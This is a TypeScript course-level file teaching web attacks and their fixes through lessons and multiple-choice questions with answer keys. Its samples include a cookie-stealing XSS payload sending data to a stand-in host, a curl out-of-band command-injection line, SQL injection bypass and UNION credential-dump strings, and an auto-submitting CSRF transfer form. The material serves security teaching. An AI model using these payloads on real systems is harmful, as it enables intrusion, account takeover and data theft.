import type { Level } from '../types'

const level: Level = {
  id: 'amateur',
  title: 'Injection, XSS and the core OWASP Top 10',
  summary:
    'The core web vulnerability classes, hands-on: cross-site scripting in all its forms, SQL injection from authentication bypass to data extraction, command injection, broken access control and IDOR, authentication and session flaws, CSRF, security misconfiguration, and file-upload attacks — plus using Burp’s Repeater and Intruder effectively. Every technique is practised only on deliberately vulnerable apps you run or targets you are authorized to test, and each is paired with the fix that closes it.',
  outcomes: [
    'Find and exploit reflected, stored and DOM-based XSS',
    'Exploit SQL injection to bypass auth and extract data',
    'Identify command injection and other injection classes',
    'Find broken access control and IDOR vulnerabilities',
    'Test authentication, session management and CSRF defences',
    'Use Burp Repeater and Intruder to probe and automate',
  ],
  steps: [
    {
      id: 'rweb-a-01',
      title: 'Cross-site scripting in depth',
      read: `Beginner introduced reflected input as the seed of **XSS** (cross-site scripting). Now learn all three forms and *why* XSS matters. XSS is injecting JavaScript that runs in a **victim's** browser — a client-side attack that harms *users*, not the server directly.

## The three types

- **Reflected XSS** — your input is echoed straight back in the response (a search term, an error). It requires getting the victim to click a crafted link (the payload is in the request). Non-persistent: it affects whoever follows that specific link.
- **Stored (persistent) XSS** — your input is *saved* by the app (a comment, a profile name, a review) and served to *everyone* who views that content, with no link needed. This is the most dangerous form: one injected comment can hit every visitor, including admins.
- **DOM-based XSS** — the vulnerability is entirely in the **client-side JavaScript**: the page's own script takes attacker-controllable data (e.g. from the URL fragment \`#...\`) and writes it unsafely into the DOM (e.g. \`innerHTML\`). The server may never see the payload. You find these by reading the JavaScript.

## Why XSS is dangerous

JavaScript in the victim's browser runs **with the victim's session**. So XSS can: **steal session cookies/tokens** (account takeover), **perform actions as the victim** (change their email, make a transfer), **capture keystrokes** (fake login forms), **read page contents**, and **pivot** to further attacks. Stored XSS hitting an admin can mean full application compromise.

## Finding and proving it

The method from beginner scales: find where input reaches the HTML (reflected, stored) or the DOM (client JS), send a harmless probe (\`<b>test</b>\`), confirm it renders, then prove execution with \`alert(1)\` (or \`alert(document.domain)\` to show the context) in your lab. Note *where* it's reflected — inside an HTML tag, an attribute, a script block — because that determines the payload (the "context").

## The fix (the mirror)

- **Output encoding** — escape user data for the context it's placed in (HTML, attribute, JS). The primary fix.
- **Content Security Policy (CSP)** — restrict what scripts can run, as defence in depth.
- **Framework auto-escaping** — modern frameworks (React, etc.) escape by default; XSS often creeps back in via unsafe APIs (\`dangerouslySetInnerHTML\`, \`innerHTML\`).

In the lab, find and prove one of each type in Juice Shop/DVWA, and note the context of each reflection.`,
      sample: {
        lang: 'html',
        caption: 'Three XSS types and where the flaw lives',
        code: `<!-- REFLECTED: input echoed in the response (needs a clicked link) -->
/search?q=<script>alert(1)</script>

<!-- STORED: input SAVED and served to everyone who views it -->
comment = <script>fetch('//me/'+document.cookie)</script>
<!-- one comment -> every viewer (incl. admins) = most dangerous -->

<!-- DOM-BASED: the page's OWN JavaScript is the flaw -->
<script>
  // takes the URL fragment and writes it raw into the page:
  document.getElementById('out').innerHTML = location.hash.slice(1)
</script>`,
        output: `XSS = attacker JS running in the VICTIM's browser, with their
session: steal cookies/tokens, act as the victim, keylog, pivot.
Stored hitting an admin = app compromise. Fix: output-encode for
context, + CSP, + framework auto-escaping (avoid innerHTML etc.).`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is stored (persistent) XSS generally considered more dangerous than reflected XSS?',
        options: [
          'Stored XSS runs on the server while reflected runs in the browser',
          'Stored XSS is saved by the app and served to everyone who views the affected content — with no crafted link required — so a single injection can hit every visitor, including admins, whereas reflected XSS only affects whoever is tricked into following a specific crafted link',
          'Reflected XSS cannot steal cookies but stored XSS can',
          'Stored XSS does not require the input to reach the HTML',
        ],
        answer: 1,
        explain:
          'Both reflected and stored XSS run attacker JavaScript in a victim’s browser with the victim’s session (so both can steal cookies, act as the victim, etc.). The difference is reach and delivery. Reflected XSS lives in a response echoing the current request, so it only affects a victim who is induced to click a specifically crafted link. Stored XSS is persisted by the application (a comment, profile field, review) and then served to everyone who views that content, with no special link needed — so one injection can hit every visitor automatically, and if an admin views it, that can escalate to full application compromise. That automatic, broad, no-interaction delivery is why stored XSS is rated more dangerous. (DOM-based XSS is a third category where the flaw is in the client-side JavaScript itself.)',
        hint: 'Who gets hit, and does the victim need to click a special link, for each type?',
      },
    },

    {
      id: 'rweb-a-02',
      title: 'SQL injection basics',
      read: `**SQL injection (SQLi)** is the classic server-side injection: attacker input flows into a database query, letting you change what the query does. It can bypass logins, read any data, and sometimes take over the server. It maps to OWASP Injection.

## Why it happens

Apps build SQL queries using user input. If they **concatenate** input directly into the query string instead of using **parameterised queries**, your input becomes *part of the SQL code*, not just data. That is the whole vulnerability — the same master pattern (untrusted input reaching an interpreter) as XSS, but the interpreter is the database.

## The classic authentication bypass

Consider a login that builds: \`SELECT * FROM users WHERE user='<input>' AND pass='<input>'\`. Send the username \`admin'--\` and the query becomes \`... WHERE user='admin'--' AND pass='...'\`. The \`--\` starts a SQL comment, so the password check is **commented out** — you log in as admin without a password. Or \`' OR '1'='1\` makes the WHERE always true.

## Detecting SQLi

The first probe is a single quote (\`'\`). If it causes an error (or a 500, or a change in behaviour), the input is likely reaching the query unescaped. Then confirm with logic:

- \`' OR '1'='1\` vs \`' AND '1'='2\` — if the two produce *different* results (one shows data, one doesn't), the input is being evaluated as SQL. This "true vs false" test confirms injection even without a visible error.

## The types (a preview)

- **In-band / error-based** — the app shows results or errors directly (easiest).
- **UNION-based** — pull data from other tables into the results (next step).
- **Blind** — no visible output, but the app behaves differently for true/false (boolean) or takes longer (time-based) — intermediate topics.

## The fix (the mirror)

- **Parameterised queries / prepared statements** — the definitive fix: input is sent as *data*, separately from the query, so it can never become code. Use them everywhere.
- **ORMs used correctly**, least-privilege DB accounts, and input validation as defence in depth.

"Input concatenated into SQL" → "use parameterised queries" is the finding. In the lab, bypass a login with \`admin'--\` and confirm injection with the true/false test.`,
      sample: {
        lang: 'sql',
        caption: 'Authentication bypass via SQL injection',
        code: `-- The app builds (UNSAFE - concatenates input):
SELECT * FROM users WHERE user = 'INPUT' AND pass = 'INPUT';

-- You send username:  admin'--
SELECT * FROM users WHERE user = 'admin'--' AND pass = '...';
-- everything after -- is a COMMENT -> password check removed
-- -> you are logged in as admin.

-- Confirm injection with true vs false:
--   ' OR '1'='1   (always true  -> data)
--   ' AND '1'='2  (always false -> no data)`,
        output: `SQLi = input becomes part of the SQL CODE (concatenation).
admin'-- comments out the password check. ' OR '1'='1 makes WHERE
always true. Fix: PARAMETERISED QUERIES (input sent as data, never
code) + least-privilege DB accounts. Same pattern as XSS, different
interpreter (the database).`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What is the root cause of SQL injection, and the definitive fix?',
        options: [
          'The database password is weak; the fix is a stronger password',
          'User input is concatenated directly into the SQL query string, so it becomes part of the SQL code rather than mere data — and the definitive fix is parameterised queries (prepared statements), which send input as data separately from the query so it can never be interpreted as code',
          'The database is exposed to the internet; the fix is a firewall',
          'The app uses too many tables; the fix is to reduce them',
        ],
        answer: 1,
        explain:
          'SQL injection is an instance of the master injection pattern: untrusted input reaching an interpreter. It happens specifically when an application builds a SQL query by concatenating user input into the query string, so input like `admin\'--` or `\' OR \'1\'=\'1` becomes part of the SQL code (commenting out a password check, or making a WHERE clause always true) rather than being treated as a value. The definitive fix is parameterised queries / prepared statements: the query structure is fixed and the input is passed separately as data, so it is never parsed as SQL code — closing the vulnerability regardless of what the input contains. Least-privilege database accounts and input validation are useful defence in depth, but the core fix is parameterisation. A weak DB password, exposure, or table count are unrelated to why injection occurs.',
        hint: 'Injection is "input becomes code" — what makes input become code, and what makes it stay data?',
      },
    },

    {
      id: 'rweb-a-03',
      title: 'SQL injection: extracting data',
      read: `Bypassing a login proves SQLi; **extracting data** shows its full impact. The classic technique is the **UNION** attack, which pulls data from other tables into the app's own results.

## The UNION technique

SQL's \`UNION\` combines the results of two \`SELECT\`s. If an injectable query returns results to the page, you can append \`UNION SELECT ...\` to make it *also* return data of your choosing — from any table you can read. To do it, two things must line up:

1. **Column count** — the injected \`SELECT\` must return the *same number of columns* as the original. You find it with \`ORDER BY 1\`, \`ORDER BY 2\`, ... until it errors (that reveals the count), or \`UNION SELECT NULL,NULL,...\` adding NULLs until it works.
2. **A visible column** — find which returned columns are actually displayed on the page, so you know where your extracted data will appear (put markers like \`'a','b'\` and see which show).

## Extracting real data

Once aligned, you query the database's own metadata and tables:

- **Enumerate structure** — the \`information_schema\` (in MySQL/Postgres/MSSQL) lists all tables and columns. \`UNION SELECT table_name,NULL FROM information_schema.tables\` reveals what exists.
- **Dump data** — then \`UNION SELECT username,password FROM users\` pulls the credentials into the page.
- **Fingerprint** — \`version()\`, \`database()\`, \`user()\` identify the DBMS and privileges, tailoring the attack.

## Automation: sqlmap

**sqlmap** automates detection and extraction of SQLi across all these techniques (UNION, blind, time-based) and many databases. It is powerful, but use it responsibly and only in scope — and understand the manual technique first, so you know what it's doing and can verify its findings (and handle cases it misses). Run destructive options never; sqlmap can modify data.

## Why this is high impact

Data extraction turns "there's a bug" into "I retrieved every user's credentials / all customer records" — often a critical finding, because the database usually holds the app's most sensitive data. It is also why SQLi remains one of the most serious web vulnerabilities decades on.

## The fix (unchanged)

**Parameterised queries** prevent all of this; least-privilege DB accounts limit what a successful injection can reach. In the lab, use a UNION injection to enumerate tables via \`information_schema\` and extract a credentials table, then try sqlmap and compare.`,
      sample: {
        lang: 'sql',
        caption: 'A UNION-based data extraction',
        code: `-- 1. find the column count:
' ORDER BY 1--   ' ORDER BY 2--   ' ORDER BY 3--   (errors at 3 -> 2 cols)

-- 2. find a visible column (which shows on the page):
' UNION SELECT 'AAA','BBB'--       (see where AAA/BBB appear)

-- 3. enumerate tables/columns via information_schema:
' UNION SELECT table_name, NULL FROM information_schema.tables--

-- 4. dump the loot:
' UNION SELECT username, password FROM users--`,
        output: `UNION appends attacker-chosen data to the app's own results.
Line up column count + a visible column, enumerate structure via
information_schema, then dump credentials. sqlmap automates it
(verify + stay in scope; never destructive). Impact: the whole
database. Fix (unchanged): parameterised queries + least privilege.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'In a UNION-based SQL injection, why must you first determine the number of columns the original query returns?',
        options: [
          'To make the page load faster',
          'Because a UNION combines two SELECTs only if they return the same number of columns — so your injected UNION SELECT must match the original query’s column count (found via ORDER BY n or adding NULLs) before it will execute and let you pull data from other tables',
          'Because the database password length equals the column count',
          'Because UNION only works on single-column tables',
        ],
        answer: 1,
        explain:
          'SQL’s UNION operator concatenates the result sets of two SELECT statements, and it is only valid when both SELECTs return the same number of columns (and compatible types). So to inject `UNION SELECT ...` onto the original query, your injected SELECT must have exactly as many columns as the original returns — otherwise the database rejects it with an error. You discover that count by incrementing `ORDER BY 1`, `ORDER BY 2`, ... until it errors, or by adding NULLs to a `UNION SELECT NULL,NULL,...` until it succeeds. You then identify which column is actually displayed on the page (so you know where extracted data appears), enumerate the schema via information_schema, and dump real data like credentials. Parameterised queries prevent all of this; least-privilege DB accounts limit the blast radius.',
        hint: 'What condition must two SELECTs satisfy for UNION to combine them?',
      },
    },

    {
      id: 'rweb-a-04',
      title: 'Command injection and other injections',
      read: `The injection pattern generalises: wherever untrusted input reaches an **interpreter**, injection is possible. Beyond SQL and HTML/JS, the most severe is **OS command injection**.

## OS command injection

If an app passes user input into a **system/shell command** (to ping a host, convert a file, call a tool), and does so unsafely, your input can inject *additional commands*. Shell metacharacters chain commands:

- \`;\` runs a second command: \`ping 8.8.8.8; whoami\`.
- \`|\` pipes; \`&&\` runs if the first succeeds; \`\` \`$( )\` \`\` substitute command output; \`&\` backgrounds.

So a "ping this host" field that runs \`ping <input>\` becomes, with input \`8.8.8.8; id\`, a way to run \`id\` — arbitrary commands on the server. **This is often critical: it is direct code execution on the server** (remote code execution), the most severe outcome.

## Detecting it

Send an input that would cause an observable side effect if a second command ran: a command that sleeps (a timing signal), or one whose output appears in the response. Because output is not always shown (blind), timing (\`; sleep 5\`) or out-of-band signals (make the server call a host you control) confirm it — the same blind-vs-visible idea as SQLi.

## Other injection classes (the pattern everywhere)

- **LDAP injection**, **XPath injection**, **NoSQL injection** — input into an LDAP/XPath/NoSQL query.
- **Template injection (SSTI)** — input into a server-side template engine → often RCE (a skilled topic).
- **Header/CRLF injection**, **log injection**, **XXE** (into an XML parser) — each is "input into a parser/interpreter."

The lesson: whenever you see input flowing into *any* interpreter, ask whether it's separated from the code or concatenated into it.

## The fix (the master mirror)

The fix generalises too: **never build interpreter input by concatenation.** For commands: avoid shelling out; use APIs that take arguments as a list (no shell), or strictly allowlist input. For SQL: parameterise. For HTML: encode. For XML: disable dangerous features. The one-sentence rule — *separate code from data, and treat all input as data* — closes the entire injection family. In the lab, find a command-injection point in DVWA, confirm it with a timing payload, and note the fix.`,
      sample: {
        lang: 'bash',
        caption: 'OS command injection: chaining a second command',
        code: `# The app runs (UNSAFE):   ping -c1 <INPUT>
# You send INPUT:           8.8.8.8; id

ping -c1 8.8.8.8; id
#            ^ first command  ^ your injected command runs too!

# Blind (no output shown)? Confirm with timing or out-of-band:
8.8.8.8; sleep 5           # response delayed 5s = injection
8.8.8.8; curl http://me/$(whoami)   # server calls you = confirmed`,
        output: `Command injection = input into a shell command -> run arbitrary
commands on the SERVER (often RCE = most severe). Metacharacters:
; | && $( ) chain commands. Confirm blind via timing/out-of-band.
FIX (whole family): separate code from data - no shell (arg lists),
parameterise SQL, encode HTML, allowlist. Treat all input as data.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'A field that runs `ping <input>` on the server is vulnerable to command injection. Why is this typically more severe than, say, reflected XSS, and what is the general fix for the whole injection family?',
        options: [
          'It is less severe than XSS; the fix is client-side validation',
          'It usually means arbitrary command execution on the server itself (remote code execution) rather than affecting a user’s browser — and the general fix is to separate code from data everywhere: avoid shelling out (use argument-list APIs), parameterise SQL, encode HTML, and treat all input as data',
          'It only affects the user who submits the form; the fix is a CAPTCHA',
          'It is identical in impact to XSS; both are client-side',
        ],
        answer: 1,
        explain:
          'OS command injection lets attacker input inject additional shell commands into a command the server runs (using metacharacters like `;`, `|`, `&&`, `$( )`), which means arbitrary code execution on the server — remote code execution, typically the most severe outcome, because it can lead to full server compromise. That is a server-side impact, distinct from reflected XSS, which runs in a victim’s browser and harms users. The general fix is the master mirror for all injection: separate code from data and treat every input as data — for commands, avoid invoking a shell and use APIs that take arguments as a list (or strictly allowlist), for SQL use parameterised queries, for HTML use output encoding, for XML disable dangerous parser features. Client-side validation and CAPTCHAs do not address it.',
        hint: 'Where does the injected code run — the browser or the server — and what single principle closes every injection class?',
      },
    },

    {
      id: 'rweb-a-05',
      title: 'Broken access control and IDOR',
      read: `**Broken access control** is consistently the OWASP #1 risk: the app fails to properly enforce *what a user is allowed to do*. Unlike injection, it needs no special payload — often just changing a value — which makes it common, high-impact, and a favourite of testers.

## The core idea

Authentication is *who you are*; **authorization** (access control) is *what you're allowed to do*. Broken access control means the app authenticates you but then fails to check that you should be allowed to access a particular resource or function. Two flavours:

- **Horizontal** — accessing *another user's* data at your own privilege level (your account viewing someone else's).
- **Vertical** — accessing *higher-privilege* functions (a normal user reaching admin functionality).

## IDOR (Insecure Direct Object Reference)

The classic, easy-to-find case: the app references an object by an id in the request (\`/account?id=1005\`, \`/invoice/4021\`, \`/api/users/5\`), and does not check that *you* are allowed that object. So you **change the id** to another value and get someone else's data. If \`/invoice/4021\` shows your invoice, does \`/invoice/4022\` show a stranger's? If it does, that's IDOR — broken access control in its simplest form. This includes ids in URLs, body parameters, and API paths.

## Other access-control failures

- **Forced browsing** — reaching an admin page (\`/admin\`) directly because access isn't checked, only hidden from the menu.
- **Method/parameter tampering** — the app checks access on the UI but not the API; or trusts a \`role=user\` field you can change to \`role=admin\`.
- **Missing function-level checks** — an API endpoint that performs an admin action without verifying the caller is an admin.

## How to test

Access control is tested by **being different users** and trying to cross boundaries: log in as a low-privileged user, then attempt to access another user's objects (change ids) and admin functions (hit admin endpoints). Comparing what each role *can* reach against what it *should* is the method — which is why mapping roles (beginner) mattered.

## The fix (the mirror)

- **Enforce authorization on every request, server-side** — for every object and function, check that *this* user may access *this* resource. Never rely on hiding a link or an unguessable id.
- **Deny by default**, use access-control checks centrally, and don't trust client-supplied role/identity.

"Object accessible by changing an id without an ownership check" → "enforce per-object authorization server-side" is the finding. In the lab, find an IDOR in Juice Shop (access another user's data by changing an id) and reach an admin function as a normal user.`,
      sample: {
        lang: 'text',
        caption: 'IDOR: change the id, get someone else’s data',
        code: `Logged in as user 1005. The app requests:
  GET /api/account/1005      -> YOUR data (fine)

You change the id:
  GET /api/account/1006      -> someone ELSE's data?!
  -> if it returns it, the app never checked OWNERSHIP = IDOR

Vertical (privilege) version:
  normal user -> POST /api/admin/deleteUser   (no role check?) = broken
  or send role=admin in the body and see if it's trusted.`,
        output: `Broken access control (#1 risk): app checks WHO you are but not
WHAT you may access. IDOR = change an id, get another's object
(no ownership check). Test by being different users + crossing
boundaries. Fix: enforce per-object/function authorization on
EVERY request, server-side; deny by default; don't trust client role.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'You are logged in as a normal user and change `/api/account/1005` (your account) to `/api/account/1006`, and it returns another user’s data. What vulnerability is this, and what is the fix?',
        options: [
          'SQL injection; fix with parameterised queries',
          'Insecure Direct Object Reference (a form of broken access control): the app references an object by id but does not verify you are authorized for that object — the fix is to enforce per-object authorization on every request server-side, never relying on unguessable ids or hidden links',
          'Cross-site scripting; fix with output encoding',
          'A caching bug; fix by disabling the cache',
        ],
        answer: 1,
        explain:
          'This is an Insecure Direct Object Reference, the classic form of broken access control (OWASP’s consistently #1 risk). The application exposes an object via an identifier in the request and returns it without checking that the authenticated user is actually authorized to access that specific object — so changing the id to another value yields someone else’s data (a horizontal access-control failure). It requires no injection payload, just changing a value, which is why it is common and high-impact. The fix is to enforce authorization on every request server-side: for each object (and function), verify that this user may access this resource, deny by default, and never rely on ids being unguessable or on merely hiding a link. It is not injection or XSS — no interpreter is being abused; the app simply fails to check permissions.',
        hint: 'No payload was needed — just a changed id returning another user’s data. What is the app failing to check?',
      },
    },

    {
      id: 'rweb-a-06',
      title: 'Authentication weaknesses',
      read: `**Authentication** is how an app verifies who you are — and it fails in many ways. OWASP calls this Identification and Authentication Failures. Because auth guards everything, its weaknesses are high-impact.

## Common authentication flaws

- **Weak credentials & no lockout** — the app permits weak passwords and doesn't rate-limit or lock accounts, enabling **credential stuffing** (reused breach passwords) and **password spraying** (one common password across many users). Recall from networking: spraying avoids lockout; here you test whether lockout even exists.
- **Username enumeration** — the app reveals whether a username exists: a different message for "wrong password" vs "no such user", a different response time, or a registration/reset form that confirms accounts. This lets an attacker build a valid user list, then spray. A subtle but common finding.
- **Weak password reset** — predictable reset tokens, reset links that don't expire, host-header poisoning of reset emails, or security questions with guessable answers.
- **Default / hardcoded credentials** — \`admin/admin\`, leftover test accounts.
- **Flaws in MFA** — MFA that can be skipped by manipulating the flow, brute-forced (no rate limit on the code), or bypassed via a "remember me" or backup path.
- **Logic flaws in the flow** — e.g. reaching the post-login page directly, or a multi-step login where a step can be skipped.

## How to test

Probe each: try weak/known credentials; attempt many logins to see if lockout/rate-limiting triggers; compare responses/timing for valid vs invalid usernames (enumeration); examine the reset flow (are tokens predictable? do links expire?); test whether MFA can be evaded. Use Burp Repeater/Intruder (next steps) to automate the login attempts and compare responses.

## The impact

Broken authentication means account takeover — and if an admin account falls, often full compromise. It is the front door; a weak one undermines everything behind it.

## The fix (the mirror)

- **Strong password policy + rate limiting/lockout** against guessing.
- **Generic messages and constant-time responses** to prevent username enumeration.
- **Secure, expiring, unpredictable reset tokens**; no default accounts.
- **Robust MFA** that can't be skipped; secure session handling (next step).

In the lab, test the login for username enumeration (compare responses), attempt spraying to check for lockout, and examine the password-reset flow.`,
      sample: {
        lang: 'text',
        caption: 'Username enumeration: the app leaks which users exist',
        code: `LOGIN RESPONSES (compare valid vs invalid username):
  user=alice  pass=wrong -> "Incorrect password"   <- alice EXISTS
  user=zzzzz  pass=wrong -> "No such user"          <- doesn't exist
  => different messages LEAK valid usernames = enumeration

Also leaks via:
  - response TIMING (real user path is slower/faster)
  - registration ("username taken") / reset ("email sent" or not)

Then: build a user list -> password spray (test if lockout exists).`,
        output: `Auth flaws: weak creds + no lockout (spray/stuff), USERNAME
ENUMERATION (different message/timing for valid users), weak reset
tokens, default creds, skippable MFA. Impact: account takeover ->
often full compromise. Fix: rate-limit/lockout, GENERIC messages,
secure expiring tokens, robust MFA.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'A login form returns "Incorrect password" for real usernames but "No such user" for non-existent ones. Why is this a security weakness?',
        options: [
          'It is not a weakness; clearer error messages are good usability',
          'It is username enumeration: the differing responses let an attacker determine which usernames are valid, building a list to target with password spraying or stuffing — the fix is a generic message (and constant-time response) that does not reveal whether the account exists',
          'It means the password database is unencrypted',
          'It causes a denial of service',
        ],
        answer: 1,
        explain:
          'Distinct responses for valid versus invalid usernames leak which accounts exist — username enumeration. An attacker uses that to compile a list of real usernames and then mounts password spraying (one common password across many users) or credential stuffing (reused breach passwords) against only valid accounts, making those attacks far more efficient. The same leak can occur via response timing or via registration and password-reset flows. The fix is to make the app’s responses indistinguishable regardless of whether the account exists: a single generic message (e.g. "invalid username or password") and constant-time processing, plus rate limiting/lockout to blunt the guessing that enumeration enables. It is a real weakness despite feeling like helpful usability, and it is unrelated to encryption or availability.',
        hint: 'What can an attacker learn from the *difference* between the two messages, and what do they do with that list?',
      },
    },

    {
      id: 'rweb-a-07',
      title: 'Session management flaws',
      read: `Because HTTP is stateless, apps track logged-in users with **sessions** — and flaws in how sessions are created, transmitted, and destroyed are a rich source of account-takeover bugs.

## How sessions work

After login, the server issues a **session identifier** (usually in a **cookie**) that the browser sends with every subsequent request; the server maps it to your account. Whoever holds a valid session token *is* that user, as far as the app is concerned — a bearer credential, exactly like the tokens in the networking track. That is why protecting the token is everything.

## Common session flaws

- **Predictable / weak tokens** — if session ids are sequential or guessable, an attacker predicts a valid one and hijacks the session. Tokens must be long and cryptographically random.
- **Insecure transmission / storage** — a cookie without the **Secure** flag can leak over HTTP; without **HttpOnly**, JavaScript (via XSS) can read it and steal the session. Missing **SameSite** enables CSRF (next step).
- **Session fixation** — the app accepts a session id supplied *before* login and keeps it *after* login; an attacker who sets a victim's session id beforehand then shares the now-authenticated session. Fix: **regenerate the session id on login**.
- **No/weak expiry & broken logout** — sessions that never expire, or a logout that doesn't actually invalidate the token server-side, so a captured token works forever.
- **Token in the URL** — session ids in URLs leak via history, referrers, and logs.

## How XSS and sessions combine

This is why XSS is so dangerous: if a session cookie lacks **HttpOnly**, an XSS payload can read \`document.cookie\` and exfiltrate the session, giving instant account takeover. Session and client-side flaws compound.

## How to test

Inspect the cookie flags (Secure, HttpOnly, SameSite). Assess token randomness (collect several, look for patterns). Test fixation (does the id change on login?). Test logout (does the old token still work afterward?). Check expiry. Your proxy shows every \`Set-Cookie\` and the cookies sent.

## The fix (the mirror)

- **Long, random tokens**; **Secure + HttpOnly + SameSite** cookies.
- **Regenerate the session id on login** (defeats fixation); **invalidate server-side on logout** and enforce timeouts.
- Never put session ids in URLs.

In the lab, examine Juice Shop's session cookie flags and test whether logging out truly invalidates the token.`,
      sample: {
        lang: 'text',
        caption: 'Session cookie flags and the flaws they prevent',
        code: `Set-Cookie: session=<TOKEN>; Secure; HttpOnly; SameSite=Lax

  Secure    -> only sent over HTTPS (no plaintext leak)
  HttpOnly  -> JavaScript CANNOT read it (blunts XSS cookie theft)
  SameSite  -> not sent cross-site (blunts CSRF)

FLAWS TO TEST:
  predictable token      -> guess/hijack a session
  no HttpOnly + XSS      -> steal cookie -> account takeover
  session fixation       -> id not regenerated on login
  broken logout/expiry   -> captured token works forever`,
        output: `A session token is a BEARER credential: holder = the user. Protect
it. Flaws: predictable tokens, missing Secure/HttpOnly/SameSite,
fixation, no expiry, broken logout, token in URL. Fix: long random
tokens, all three cookie flags, REGENERATE id on login, invalidate
on logout, timeouts.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why does the absence of the HttpOnly flag on a session cookie make an XSS vulnerability far more dangerous?',
        options: [
          'HttpOnly encrypts the cookie; without it the cookie is plaintext',
          'Without HttpOnly, client-side JavaScript can read the cookie via document.cookie — so an XSS payload can steal the session token and hand the attacker an immediate account takeover; HttpOnly blocks JavaScript from reading it, breaking that chain',
          'HttpOnly prevents the cookie from being sent to the server',
          'Without HttpOnly the cookie cannot be used at all',
        ],
        answer: 1,
        explain:
          'A session token is a bearer credential — whoever holds it is treated as the user. The HttpOnly cookie flag tells the browser not to expose the cookie to client-side JavaScript (document.cookie). Without HttpOnly, an XSS payload running in the victim’s browser can read the session cookie and exfiltrate it to the attacker, who then replays it for instant account takeover — so a "mere" XSS becomes full session theft. With HttpOnly set, the script cannot read the cookie, breaking that particular attack chain (though XSS can still perform actions in-session). HttpOnly does not encrypt the cookie (that is what HTTPS/Secure is for) nor stop it being sent to the server — it specifically blocks JavaScript access. This is why session and client-side flaws compound, and why all three flags (Secure, HttpOnly, SameSite) matter.',
        hint: 'What can JavaScript do with document.cookie if HttpOnly is missing, and how does that combine with XSS?',
      },
    },

    {
      id: 'rweb-a-08',
      title: 'Cross-site request forgery',
      read: `**CSRF** (cross-site request forgery) makes a victim's browser send a request to an app where they're logged in, *without their intent* — abusing the fact that browsers automatically attach cookies. It's a different shape of attack: you don't steal the session, you *ride* it.

## How CSRF works

The browser automatically includes a site's cookies on *any* request to that site — including requests triggered by a *different* site. So if a victim is logged into \`bank.example\` and then visits the attacker's page, that page can silently make the victim's browser send an authenticated request to \`bank.example\` (a form auto-submit, an image tag hitting a GET endpoint). The bank sees a valid, cookie-authenticated request and performs the action — a transfer, an email change — *as the victim*, who never intended it.

## What makes an endpoint CSRF-vulnerable

- It performs a **state-changing action** (transfer, change email/password, delete).
- It relies **only on the session cookie** to authorize (which is auto-sent).
- It has **no unpredictable token** tying the request to the app's own forms.

If all three hold, an attacker can forge the request from another origin.

## The classic exploit

An attacker page contains a hidden form targeting the vulnerable endpoint with attacker-chosen values, and auto-submits it with JavaScript. The victim just has to be logged in and visit the page. For GET-based actions, even an \`<img src="...">\` can trigger it.

## The defence (the mirror)

- **Anti-CSRF tokens** — the app includes an unpredictable, per-session (or per-request) token in its forms and verifies it on submission. An attacker's forged request can't include the right token (they can't read it, due to the same-origin policy), so it's rejected. This is the primary defence.
- **SameSite cookies** — \`SameSite=Lax/Strict\` stops the cookie being sent on cross-site requests, blunting CSRF broadly (now a strong default).
- **Re-authentication / confirmation** for sensitive actions.

## How to test

For a state-changing request, check: is there an anti-CSRF token? Is it actually validated (remove/alter it and see if the request still works)? Is SameSite set? If a sensitive action succeeds without a validated token and without SameSite protection, it's CSRF-vulnerable. In the lab, build a simple auto-submitting form that performs an action in DVWA/Juice Shop as the logged-in victim, then observe how a CSRF token would block it.`,
      sample: {
        lang: 'html',
        caption: 'A CSRF exploit page auto-submits as the victim',
        code: `<!-- Attacker's page. Victim is logged into bank.example. -->
<form action="https://bank.example/transfer" method="POST" id="x">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.getElementById('x').submit()</script>
<!-- The browser auto-attaches bank.example's cookie ->
     the transfer runs AS THE VICTIM, who only visited a page. -->`,
        output: `CSRF = ride the victim's session (cookies auto-sent cross-site),
not steal it. Vulnerable if: state-changing + cookie-only auth +
no unpredictable token. Fix: anti-CSRF TOKEN (attacker can't read
it -> forged request rejected) + SameSite cookies + re-auth for
sensitive actions.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why does an anti-CSRF token prevent cross-site request forgery?',
        options: [
          'It encrypts the session cookie so it cannot be sent cross-site',
          'The app embeds an unpredictable token in its own forms and verifies it on submission; an attacker’s forged cross-site request cannot include the correct token (the same-origin policy prevents them reading it), so the server rejects the request even though the session cookie is auto-attached',
          'It logs the user out whenever they visit another site',
          'It blocks all POST requests to the application',
        ],
        answer: 1,
        explain:
          'CSRF works because browsers automatically attach a site’s cookies to requests aimed at that site, even when another site triggers them — so a forged cross-site request looks authenticated. An anti-CSRF token defeats this by adding a secret the attacker cannot supply: the application places an unpredictable, per-session (or per-request) token in its legitimate forms and validates it on every state-changing request. An attacker forging a request from their own page cannot read that token — the same-origin policy stops them reading the app’s pages/DOM — so their request lacks the correct token and is rejected, despite the cookie being sent. SameSite cookies complement this by preventing the cookie from being sent cross-site at all. The token is not encryption, does not log users out, and does not block all POSTs.',
        hint: 'The attacker can make the browser send the cookie, but what can they NOT read or include, and why (same-origin policy)?',
      },
    },

    {
      id: 'rweb-a-09',
      title: 'Misconfiguration and disclosure',
      read: `Not every vulnerability is a clever injection; many are simply **things left insecure** — OWASP Security Misconfiguration — and **information disclosure** that hands attackers the details they need. These are common, easy to find, and often high-impact.

## Security misconfiguration

- **Default credentials & accounts** — admin panels, databases, devices left at \`admin/admin\` or with sample accounts.
- **Unnecessary features enabled** — debug endpoints, admin consoles, sample apps, directory listing turned on.
- **Verbose error messages** — stack traces that reveal frameworks, versions, file paths, and query structure (a gift for building further attacks).
- **Missing security headers** — no \`Content-Security-Policy\`, \`X-Frame-Options\`, \`Strict-Transport-Security\`; each absence is a finding and weakens other defences.
- **Insecure defaults & permissions** — cloud storage (S3 buckets) left public, overly permissive CORS, misconfigured servers.
- **Outdated components** — running framework/library versions with known CVEs (OWASP Vulnerable and Outdated Components) — check versions against advisories.

## Information disclosure

Apps leak information that aids attacks:

- **Exposed files** — \`/.git/\` (full source history!), backup files (\`.bak\`, \`.zip\`), \`.env\` files with secrets, \`/phpinfo.php\`, config files. Content discovery finds these.
